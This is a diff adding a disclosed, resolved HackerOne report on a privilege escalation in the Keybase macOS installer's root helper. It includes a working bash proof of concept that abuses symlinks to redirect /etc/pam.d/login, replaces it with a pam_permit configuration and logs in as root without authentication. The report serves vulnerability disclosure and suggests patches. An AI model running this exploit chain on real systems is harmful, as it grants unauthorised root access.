@@ -1,0 +1,127 @@
+{
+  "id": 473252,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NzMyNTI=",
+  "url": "https://hackerone.com/reports/473252",
+  "title": "Privilege Escalation through Keybase Installer via Helper",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-12-30T05:48:58.619Z",
+  "submitted_at": "2018-12-30T05:48:58.619Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jinmo123",
+    "url": "/jinmo123",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 2809,
+    "url": "https://hackerone.com/keybase",
+    "handle": "keybase",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Keybase",
+      "twitter_handle": "keybaseio",
+      "website": "https://keybase.io",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-01-30T18:59:22.293Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-01-30T18:59:22.209Z",
+  "team_member_agreed_on_going_public_at": "2019-01-30T18:16:08.064Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Keybase.app is bundled with the components installer named KeybaseInstaller.app. When `--install-app-bundle --source-path <src> --app-path <dst>` is given to installer, KBAppBundle.m checks if `<src>`  is properly codesigned, then copies it to `<dst>`.\n\nFirst, there's two vulnerabilities in the source path validation: the check is racy, there's no symlink check.\n\n## 1. Race condition\n\nSince now the privileged helper (user=root) only accepts XPC request from 'admin' group, The path `/Application/Keybase.app` is often writable. So I think that race condition is possible between (1) and (2).\n\n```objc\n(1)   [self validate:sourcePath completion:^(NSError *error) {\n        if (error) {\n          completion(error);\n          return;\n        }\n\n        DDLogInfo(@\"Copying app bundle %@ to %@\", sourcePath, destinationPath);\n        NSDictionary *params = @{@\"source\": sourcePath, @\"destination\": destinationPath};\n(2)     [self.helperTool.helper sendRequest:@\"move\" params:@[params] completion:^(NSError *error, id value) {\n```\n\nSuccessful exploitation will bypass the source check. I skipped writing PoC code since the race window is bit narrow.\n\n## 2. No symbolic link check\n\nIf source path is symbolic link to /Application/Keybase.app, the check is bypassed. Attacker can make a symbolic link like this:\n\n/tmp/A -> /tmp/B -> /Application/Keybase.app\n\nBecause the helper uses `NSFileManager::moveItemAtPath`, the symbolic link itself is copied. Copying /tmp/A causes destination path to be a symbolic link to /tmp/B, and further it can be modified to our file.\n\n## 3. Missing check for destination\n\nSecond, there's no check for the destination path, which is passed from `--app-path` parameter. This makes the admin to overwrite any file or folder like `/etc`.\n\nCombining 2, 3, user can overwrite any files to point the writable path.\n\n```bash\n#!/bin/bash\n\nexport APP=/Applications/Keybase.app\nexport INSTALLER=$APP/Contents/Resources/KeybaseInstaller.app/Contents/MacOS/Keybase\n\nexport A=/tmp/_$RANDOM\nexport B=/tmp/_$RANDOM\n\n# This script does `ln -sf /tmp/$R $DEST` in root permission\nexport DEST=/etc/pam.d/login\n\nrm -rf $A $B\nln -s $APP $B\nln -s $B $A\n\n$INSTALLER --run-mode=prod --app-path=$DEST --timeout=8 --install-app-bundle --source-path=$A --debug\n\n# Now $DEST -> /tmp/$B (symlink)\n# replace /tmp/$B to own contents\nrm -rf /tmp/$B\n\ncat > /tmp/$B <<EOF\n# login: auth account password session\nauth       optional       pam_permit.so\nauth       optional       pam_permit.so\nauth       optional       pam_permit.so\nauth       required       pam_permit.so\naccount    required       pam_permit.so\naccount    required       pam_permit.so\npassword   required       pam_permit.so\nsession    required       pam_permit.so\nsession    required       pam_permit.so\nsession    optional       pam_permit.so\n\nEOF\n\n# Now there's no pam-based check for /usr/bin/login\necho id | login root\n```\n\n\n\n## Patch\n\n### Source path check\n\nMaybe the app bundle can be compressed with proper signature, and checked in the way of the redirector check on [KBHelper.m line 260](https://github.com/keybase/client/blob/363e5462a0805db3fb5b5e31f9f5bc2d4d01964f/osx/Helper/KBHelper.m#L260), and extracted in the helper.\n\n### Destination path check\n\nI'm not sure how this can have additional restrictions, but maybe user alerts like those in `--install-helper` would be good. Alternatively, checking if `app_path == \"/Applications/Keybase.app\"` will work, too.\n\n## Impact\n\nThe privilege can be escalated to 'root' from any user in 'admin' group (including the default user) and have access to keybase.Helper XPC service.",
+  "bounty_amount": "2500.0",
+  "formatted_bounty": "$2,500",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 17,
+  "voters": [
+    "mirchr",
+    "dxaxpanda",
+    "bl4de",
+    "spam404",
+    "ali",
+    "dhakal_ananda",
+    "setuid0",
+    "kunal94",
+    "khizer47",
+    "codeanddecode",
+    "and 7 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.2,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "high",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
